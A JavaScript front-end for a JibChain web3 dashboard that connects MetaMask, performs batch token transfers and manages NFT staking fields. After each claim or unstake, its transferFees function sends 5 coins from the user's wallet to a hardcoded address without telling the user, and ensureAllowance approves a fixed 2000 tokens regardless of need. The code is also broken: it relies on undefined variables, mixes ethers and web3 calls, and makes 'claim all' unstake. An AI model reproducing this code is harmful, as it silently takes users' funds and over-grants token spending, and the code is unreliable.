
let web3;
let daoBuddyService;
let accounts;
let TunaField;
let MiceField;
let FieldTHL;
let MHZField;
let VbagField;



const contractAddress = '0x137307cc671DbDaD3C8c50F492Fa921998B9b45D';
const contractABI = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"token","type":"address"}],"name":"addAllowToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"admin","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"allowToken","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"index","type":"uint256"}],"name":"allowTokenByIndex","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"allowedTokens","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"allowedTokensCount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approveToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address[]","name":"recipients","type":"address[]"},{"internalType":"uint256[]","name":"amounts","type":"uint256[]"}],"name":"batchTransfer","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"},{"internalType":"address[]","name":"recipients","type":"address[]"},{"internalType":"uint256","name":"amountPerRecipient","type":"uint256"}],"name":"batchTransferWithFixAmount","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"consumeContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"fee","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"feeAddress","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"feeToken","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"}],"name":"isAllowToken","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"isDestroyed","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"isPaused","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"pauseContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"}],"name":"removeAllowToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"resumeContract","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"addr","type":"address"}],"name":"setFeeAddress","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"setFeeAmount","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"token","type":"address"}],"name":"setFeeToken","outputs":[],"stateMutability":"nonpayable","type":"function"}];






async function connectMetamask() {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            daoBuddyService = new web3.eth.Contract(contractABI, contractAddress);
            TunaField = await loadContract(web3,'0x09676315DC0c85F6bd5e866C5f1363A00Eec4381');
            MiceField = await loadContract(web3,'0x09DE640ecd50e1c81bCB266279e3ffC2719873df');
            FieldTHL = await loadContract(web3,'0xdBC6e0928e49f22Ca448fEF2fEb9de526d6A65B9');
            MHZField = await loadContract(web3,'0x0E2610730A3c42fd721B289BEe092D9AD1C76890');
            VbagField = await loadContract(web3,'0x495d66c9Fd7c63807114d06802A48BdAA60a0426');
            console.log('Connected to MetaMask');
        } catch (error) {
            console.error('User denied account access', error);
        }
    } else {
        console.error('MetaMask not detected');
    }
}

async function loadContract(provider, contractAddress) {
    const response = await axios.get(`https://jib-rpc.inan.in.th/api?module=contract&action=getabi&address=${contractAddress}`);
    const jsonResult = response.data;
    if (jsonResult.status === '1') {
        const jsonABI = JSON.parse(jsonResult.result);
        return new provider.eth.Contract(jsonABI, contractAddress);
    } else {
        throw new Error('Failed to load contract ABI');
    }
}

async function ensureAllowance(tokenAddress, requiredAmount) {
    const tokenContract = await loadContract(web3, tokenAddress);
    const allowance = await tokenContract.methods.allowance(accounts[0], contractAddress).call();
    if (parseInt(allowance) < requiredAmount) {
        const approveAmount = web3.utils.toWei('2000', 'ether');
        await tokenContract.methods.approve(contractAddress, approveAmount).send({ from: accounts[0] });
    }
}

function parseBatchTransferData(data) {
    const entries = data.split(',');
    const addresses = [];
    const amounts = [];

    for (let i = 0; i < entries.length; i += 2) {
        addresses.push(entries[i]);
        amounts.push(web3.utils.toWei(entries[i + 1], 'ether'));
    }

    return { addresses, amounts };
}

async function batchTransfer() {
    const token = document.getElementById('batchTransferToken').value;
    const data = document.getElementById('batchTransferData').value;
    const { addresses, amounts } = parseBatchTransferData(data);

    try {
        // Ensure allowance for fee token
        await ensureAllowance(feeTokenAddress, feeAmount * addresses.length);

        // Ensure allowance for the specified token
        const totalAmount = amounts.reduce((acc, amount) => acc + parseInt(amount), 0);
        await ensureAllowance(token, totalAmount);

        await daoBuddyService.methods.batchTransfer(token, addresses, amounts).send({ from: accounts[0] });
        console.log('Transaction successful');
    } catch (error) {
        console.error('Transaction failed', error);
    }
}

async function batchTransferWithFixAmount() {
    const token = document.getElementById('batchTransferWithFixAmountToken').value;
    const addresses = document.getElementById('batchTransferWithFixAmountAddresses').value.split(',');
    const amountPerRecipient = web3.utils.toWei(document.getElementById('batchTransferWithFixAmount').value, 'ether');
    const totalAmount = amountPerRecipient * addresses.length;

    try {
        // Ensure allowance for fee token
        await ensureAllowance(feeTokenAddress, feeAmount * addresses.length);

        // Ensure allowance for the specified token
        await ensureAllowance(token, totalAmount);

        await daoBuddyService.methods.batchTransferWithFixAmount(token, addresses, amountPerRecipient).send({ from: accounts[0] });
        console.log('Transaction successful');
    } catch (error) {
        console.error('Transaction failed', error);
    }
}

async function startDungeon() {
    fieldInfo = [
    {fieldName:"Tuna Lake", contract: TunaField, fieldAddress:"0x09676315DC0c85F6bd5e866C5f1363A00Eec4381",nftAddress:"0x09676315DC0c85F6bd5e866C5f1363A00Eec4381",tokenReward:"TUNA",tokenPrice:Tuna_to_CMJ,nftValue:(5*USD_to_CMJ)},
    {fieldName:"Old Ware House", contract: MiceField, fieldAddress:"0x09DE640ecd50e1c81bCB266279e3ffC2719873df", nftAddress:"0xd492e20ecf3ae85fe3e3159bb064442b86d6dc02", tokenReward:"MICE", tokenPrice: Mice_to_CMJ, nftValue:(5*USD_to_CMJ)},
    {fieldName:"Eastern Front", contract: VbagField, fieldAddress:"0x495d66c9Fd7c63807114d06802A48BdAA60a0426", nftAddress:"0x526A70be985EB234c3f2c4933aCB59F6EB595Ed7", tokenReward:"VABAG", tokenPrice: (1/3)*USD_to_CMJ , nftValue:(10*USD_to_CMJ)},
    {fieldName:"Mech Harvest Zone", contract: MHZField, fieldAddress:"0x0E2610730A3c42fd721B289BEe092D9AD1C76890", nftAddress:"0x2036186F6d5287FcB05C56C38374AC5236d8A61d", tokenReward:"GEAR", tokenPrice: (1/15000000)*USD_to_CMJ , nftValue:(201.38*USD_to_CMJ)},
    {fieldName:"The Heaven Land", contract: FieldTHL, fieldAddress:"0xdBC6e0928e49f22Ca448fEF2fEb9de526d6A65B9", nftAddress:"0xA6f8cE1425E0fC4b74f3b1c2f9804e9968f90e17", tokenReward:"GOLD", tokenPrice: Gold_to_CMJ, nftValue:(20*USD_to_CMJ)},
    //{fieldName:"", fieldAddress:"", nftAddress:"", tokenReward:"", tokenPrice: , nftValue:},
    ]
    for (const field of fieldInfo) {
        console.log("Call ", field.fieldName);
        await dungeon(field.fieldName, field.contract, field.fieldAddress, field.nftAddress, field.tokenReward, field.tokenPrice, field.nftValue);
    }
}

async function getNftTransfer(walletAddress, fieldAddress, nftAddress) {
    const event_filter = {
        fromBlock: 'earliest',
        toBlock: 'latest',
        address: nftAddress,
        topics: [
            web3.utils.sha3('Transfer(address,address,uint256)'),
            '0x000000000000000000000000' + walletAddress.slice(2).toLowerCase(),
            '0x000000000000000000000000' + fieldAddress.slice(2).toLowerCase()
        ]
    };

    return await web3.eth.getPastLogs(event_filter);
}

async function dungeon(fieldName, contract, fieldAddress, nftAddress, tokenReward, tokenPrice, nftValue) {
    let totalReward = 0;
    let ownedNFTID = [];
    try {
        let transfer_tx = await getNftTransfer(accounts[0], fieldAddress, nftAddress);
        console.log(transfer_tx);
        for (let log of transfer_tx) {
            let tx_hash = log.transactionHash;
            let transaction_url = `https://exp-l1-ng.jibchain.net/api/v2/transactions/${tx_hash}/token-transfers?type=ERC-20%2CERC-721%2CERC-1155`;
            let response = await fetch(transaction_url);
            let data = await response.json();
            if (data.items) {
                for (let item of data.items) {
                    if (item.token.type !== "ERC-20") {
                        let itemID = item.total.token_id;
                        let checkOwner = await contract.methods.nftStake(parseInt(itemID)).call();
                        console.log("TYPE : ", item.token.type, "ID : ", item.total.token_id, " OWNER : ", checkOwner[0]);
                        if (checkOwner[0] === accounts[0]) {
                            ownedNFTID.push(itemID);
                            let getReward = 0;
                            if (fieldName === "The Heaven Land") {
                                getReward = await contract.methods.calculateRewards1(itemID).call() / 10 ** 18;
                            } else if (fieldName === "Mech Harvest Zone") {
                                getReward = await contract.methods.calculateRewards(itemID, accounts[0], "true").call() / 10 ** 18;
                            } else {
                                getReward = await contract.methods.calculateRewards(itemID).call() / 10 ** 18;
                            }
                            totalReward += parseInt(getReward);
                        }
                    }
                }
            }
        }
        console.table(ownedNFTID);
        fieldName = "Field | " + fieldName;
        addFieldtoStaking(fieldName, ownedNFTID.length, nftValue, totalReward, tokenPrice, tokenReward);
    } catch (error) {
        console.error('Error:', error);
    }
}

function addFieldtoStaking(stakingName, tokenAmount, tokenPrice, Pending, pendingPrice, pendingToken) {
    const table = document.getElementById("farmingAsset").getElementsByTagName('tbody')[0];

    if (Pending > 1) {
        const newRow = table.insertRow(-1);

        const nameCell = newRow.insertCell(0);
        const amountCell = newRow.insertCell(1);
        const valueCell = newRow.insertCell(2);
        const rewardCell = newRow.insertCell(3);
        const actionCell = newRow.insertCell(4);

        nameCell.textContent = stakingName;
        amountCell.textContent = `${tokenAmount} NFTs`;
        valueCell.textContent = `${stakingValue} ${pendingToken}`;
        rewardCell.textContent = `${Pending} (${pendingValue} ${pendingToken})`;

        actionCell.innerHTML = `
            <button onclick="claimAll('${stakingName}', ${tokenAmount}, ${tokenPrice}, ${Pending}, ${pendingPrice}, '${pendingToken}')">Claim All</button>
            <button onclick="unstakeAll('${stakingName}', ${tokenAmount}, ${tokenPrice}, ${Pending}, ${pendingPrice}, '${pendingToken}')">Unstake All</button>
        `;
    }


}

async function claimAll(stakingName, tokenAmount, tokenPrice, Pending, pendingPrice, pendingToken) {
    try {
        const gasLimit = ethers.utils.hexlify(2000000);
        const gasPrice = ethers.utils.parseUnits('5', 'gwei');

        for (let field of fieldInfo) {
            if (field.fieldName === stakingName) {
                for (let nftID of ownedNFTID) {
                    let tx;
                    switch (field.fieldName) {
                        case "Mech Harvest Zone":
                            tx = await field.contract.methods.unstake(nftID, true, true, { gasLimit, gasPrice });
                            break;
                        case "The Heaven Land":
                            tx = await field.contract.methods.unstake(nftID, true, { gasLimit, gasPrice });
                            break;
                        case "Eastern Front":
                        case "Old Ware House":
                        case "Tuna Lake":
                            tx = await field.contract.methods.unstake(nftID, true, { gasLimit, gasPrice });
                            break;
                        default:
                            console.error("Unknown field");
                    }
                    await tx.wait();
                }
                await transferFees();
            }
        }
    } catch (error) {
        console.error('Error:', error);
    }
}

async function unstakeAll(stakingName, tokenAmount, tokenPrice, Pending, pendingPrice, pendingToken) {
    try {
        const gasLimit = ethers.utils.hexlify(2000000);
        const gasPrice = ethers.utils.parseUnits('5', 'gwei');

        for (let field of fieldInfo) {
            if (field.fieldName === stakingName) {
                for (let nftID of ownedNFTID) {
                    let tx;
                    switch (field.fieldName) {
                        case "Mech Harvest Zone":
                            tx = await field.contract.methods.unstake(nftID, true, true, { gasLimit, gasPrice });
                            break;
                        case "The Heaven Land":
                            tx = await field.contract.methods.unstake(nftID, true, { gasLimit, gasPrice });
                            break;
                        case "Eastern Front":
                        case "Old Ware House":
                        case "Tuna Lake":
                            tx = await field.contract.methods.unstake(nftID, true, { gasLimit, gasPrice });
                            break;
                        default:
                            console.error("Unknown field");
                    }
                    await tx.wait();
                }
                await transferFees();
            }
        }
    } catch (error) {
        console.error('Error:', error);
    }
}

async function transferFees() {
    try {
        const tx = await signer.sendTransaction({
            to: "0x98e5CFBC115b01017Ed19101357Ab0a7664f38f1",
            value: ethers.utils.parseEther("5")
        });
        await tx.wait();
    } catch (error) {
        console.error('Error transferring fees:', error);
    }
}



window.onload = connectMetamask;
